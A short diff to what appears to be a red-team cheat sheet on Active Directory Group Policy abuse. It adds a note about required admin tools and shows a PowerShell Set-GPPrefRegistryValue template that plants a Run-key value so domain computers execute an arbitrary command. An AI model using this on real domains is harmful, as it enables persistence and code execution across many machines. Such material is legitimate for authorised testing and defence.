@@ -1,3 +1,5 @@
+# requires Remote Server Administration Tools - default on domain controller
+
 # set a new registry value for specific GPO (execute command using GPO abuse)
 Set-GPPrefRegistryValue -Name '<gpoName>' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName '<name>' -Value 'powershell -c <command>' -Type ExpandString
 
